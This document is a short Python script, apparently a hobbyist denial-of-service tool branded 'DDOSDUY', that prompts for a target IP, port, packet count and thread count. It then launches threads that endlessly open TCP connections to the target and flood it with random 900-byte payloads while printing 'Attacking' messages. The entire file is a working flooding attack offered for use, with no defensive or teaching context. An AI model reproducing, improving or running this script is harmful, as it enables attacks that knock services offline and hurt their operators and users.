#!usr/bin/python3

import random

import threading

import socket

import os

import time

from termcolor import colored

os.system('cls')

print(colored(r"""

DDD  DDD   OOO   SSS  DDD  U   U Y   Y 

D  D D  D O   O S     D  D U   U  Y Y  

D  D D  D O   O  SSS  D  D U   U   Y   

D  D D  D O   O     S D  D U   U   Y   

DDD  DDD   OOO  SSSS  DDD   UUU    Y   

                                         Created by DUY""", 'red'))

print(colored("\n============================================================================================\n", 'green'))

ip = str(input(colored("[+] IP: ",'green')))

port = int(input(colored("[+] Port: ",'green')))

packet = int(input(colored("[+] Packets: ",'green')))

thread = int(input(colored("[+] Threads: ",'green')))

time.sleep(1.5)

os.system('cls')

print(colored(r"""

 / _ \| | | |           | |  (_)                  

/ /_\ \ |_| |_ __ _  ___| | ___ _ __   __ _       

|  _  | __| __/ _` |/ __| |/ / | '_ \ / _` |      

| | | | |_| || (_| | (__|   <| | | | | (_| |_ _ _ 

\_| |_/\__|\__\__,_|\___|_|\_\_|_| |_|\__, (_|_|_)

                                       __/ |      

                                      |___/    """,'green'))

print(colored("\n########################################################################",'red'))

time.sleep(2)

print(colored("\n[+] Start......",'green'))

time.sleep(1)

print(colored("\n3",'green'))

time.sleep(1)

print(colored("\n2",'green'))

time.sleep(1)

print(colored("\n1",'green'))

time.sleep(1)

os.system('cls')

def syn():

    hevin = random._urandom(900)

    bb = int(0)

    while True:

        try:

            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            h.connect((ip,port))

            h.send(hevin)

            for i in range(packet):

                h.send(hevin)

            bb += 1

            print(colored('[+] Attacking '+ip +'>>>Sent: '+str(bb), 'red'))

        except KeyboardInterrupt:

            h.close()

            print(colored("[+++] DONE !!!!", 'green'))

            pass

for b in range(thread):

    thread = threading.Thread(target=syn)

    thread.start()

